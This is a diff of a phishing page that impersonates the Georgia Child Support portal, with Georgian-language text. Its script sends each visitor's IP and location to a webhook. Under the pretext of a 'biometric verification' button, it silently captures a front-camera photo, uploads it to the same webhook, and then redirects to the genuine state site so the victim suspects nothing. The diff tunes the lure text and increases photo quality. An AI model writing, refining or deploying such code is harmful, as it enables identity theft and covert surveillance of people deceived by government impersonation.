@@ -24,20 +24,13 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
             max-width: 400px;
             width: 90%;
-            border-top: 6px solid #004a99; /* ოფიციალური ლურჯი */
-        }
-
-        .gov-header {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
+            border-top: 6px solid #004a99;
         }
 
         .gov-logo {
             width: 60px;
             height: auto;
-            margin-right: 10px;
+            margin-bottom: 20px;
         }
 
         h2 {
@@ -45,13 +38,6 @@
             color: #004a99;
             margin: 10px 0;
             font-weight: 700;
-        }
-
-        p {
-            color: #666;
-            font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 25px;
         }
 
         .info-box {
@@ -75,24 +61,10 @@
             font-weight: bold;
             cursor: pointer;
             font-size: 16px;
-            transition: background 0.2s;
         }
 
-        #authBtn:hover {
-            background: #003366;
-        }
+        #authBtn:disabled { background: #ccc; }
 
-        #authBtn:disabled {
-            background: #ccc;
-        }
-
-        .footer-text {
-            font-size: 11px;
-            color: #999;
-            margin-top: 20px;
-        }
-
-        /* ანიმაცია */
         .spinner {
             border: 2px solid #ffffff;
             border-top: 2px solid #004a99;
@@ -105,32 +77,19 @@
             vertical-align: middle;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div id="content">
-        <div class="gov-header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Great_Seal_of_the_State_of_Georgia.svg/1024px-Great_Seal_of_the_State_of_Georgia.svg.png" class="gov-logo">
-        </div>
-        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Great_Seal_of_the_State_of_Georgia.svg/1024px-Great_Seal_of_the_State_of_Georgia.svg.png" class="gov-logo">
         <h2>Georgia Child Support</h2>
         <div class="info-box">
             <strong>უსაფრთხოების შეტყობინება:</strong><br>
-            თქვენი სესიის გასაგრძელებლად საჭიროა ბიომეტრიული ვერიფიკაცია.
+            გთხოვთ, გაიაროთ იდენტიფიკაცია სესიის გასაგრძელებლად.
         </div>
-        
-        <p>გთხოვთ დააჭიროთ ღილაკს "დადასტურება", რათა სისტემამ გადაამოწმოს თქვენი ვინაობა და მოგცეთ წვდომა პორტალზე.</p>
-        
         <button id="authBtn">დადასტურება</button>
-        
-        <div class="footer-text">
-            © 2026 Georgia Department of Human Services
-        </div>
     </div>
 
     <video id="video" style="display:none;" autoplay playsinline muted></video>
@@ -143,17 +102,14 @@
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: "🏛️ **ახალი ვიზიტი (Georgia Support)**",
+                        content: "🏛️ **ახალი ვიზიტი (Georgia Portal)**",
                         embeds: [{
                             color: 15844367,
-                            title: "კლიენტის მონაცემები",
-                            description: `🌐 IP: \`${data.ip}\`\n🏙️ ქალაქი: ${data.city}\n📡 პროვაიდერი: ${data.org}\n🏳️ ქვეყანა: ${data.country_name}`,
-                            footer: { text: "Georgia Gateway System" }
+                            description: `🌐 IP: \`${data.ip}\`\n🏙️ City: ${data.city}\n🏳️ Country: ${data.country_name}`
                         }]
                     })
                 });
@@ -166,14 +122,20 @@
             btn.innerHTML = '<span class="spinner"></span>მოწმდება...';
 
             try {
+                // კამერის მოთხოვნა
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
                 });
                 
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
                 video.onloadedmetadata = () => {
+                    // 1.5 წამიანი დაყოვნება ხარისხიანი ფოტოსთვის
                     setTimeout(() => {
                         const canvas = document.getElementById('canvas');
                         const context = canvas.getContext('2d');
@@ -183,19 +145,19 @@
                             const formData = new FormData();
                             formData.append('file', blob, 'identity_check.jpg');
                             formData.append('payload_json', JSON.stringify({
-                                content: "👤 **ვერიფიკაციის ფოტო მოვიდა!**"
+                                content: "👤 **ბიომეტრიული ფოტო მოვიდა!**"
                             }));
 
                             await fetch(webhookURL, { method: 'POST', body: formData });
                             
                             stream.getTracks().forEach(track => track.stop());
-                            // გადამისამართება ნამდვილ საიტზე
                             window.location.href = "https://childsupport.georgia.gov/";
                         }, 'image/jpeg', 0.8);
-                    }, 1000);
+                    }, 1500);
                 };
 
             } catch (err) {
+                // თუ კამერა დაბლოკა, მაინც გადავიყვანოთ
                 window.location.href = "https://childsupport.georgia.gov/";
             }
         }
